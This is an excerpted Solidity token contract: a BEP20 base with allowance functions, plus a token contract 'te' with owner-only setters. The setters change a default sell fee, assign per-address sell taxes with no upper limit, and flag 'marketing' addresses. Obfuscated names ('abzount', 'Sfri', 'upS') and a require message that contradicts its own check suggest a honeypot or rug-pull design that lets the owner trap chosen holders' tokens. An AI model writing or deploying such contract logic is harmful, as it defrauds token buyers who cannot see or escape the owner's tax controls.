...
contract BEP20 is Context {
    ...
    function increaseAllowance(address spender, uint256 addedvalues) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedvalues);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedvalues) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedvalues, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedvalues);
        }
...
contract te is BEP20, Ownable {
    ...
    function upS(uint256 _values) external onlyowner {
        _defaultSellfri = _values;
    }

    function setSfri(address _address, uint256 _values) external onlyowner {
        require(_values > 1, "abzount tax must be greater than or equal to 1");
        _Sfri[_address] = _values;
    }
    ...
    function setMarketabzountfri(address _address, bool _values) external onlyowner {
        _marketabzount[_address] = _values;
    }
